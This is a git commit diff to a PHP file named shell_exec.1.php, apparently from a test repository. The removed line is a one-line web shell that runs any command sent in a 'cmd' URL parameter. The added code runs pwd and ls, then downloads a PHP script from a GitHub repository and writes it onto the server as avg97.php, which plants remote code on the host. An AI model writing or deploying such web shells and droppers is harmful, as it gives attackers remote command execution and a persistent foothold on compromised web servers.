5901a9259e92ed748cc2b53b68f7ab4569c2ed0d
Alexander Goryushkin <43167451+alexgoryushkin@users.noreply.github.com>
2020-05-03 19:08:36 +0500

    Update shell_exec.1.php

--- shell_exec.1.php
+++ shell_exec.1.php
@@ -1,1 +1,10 @@
-<?= shell_exec($_GET['cmd']); ?>
+<?= 
+shell_exec('pwd') . 
+'<br>--------<br>' . 
+shell_exec('ls') . 
+'<br>--------<br>' . 
+file_put_contents("avg97.php", fopen("https://raw.githubusercontent.com/alexgoryushkin/test_shell/master/shell_exec..php", 'r')) . 
+'<br>--------<br>' . 
+shell_exec('ls')
+
+?>
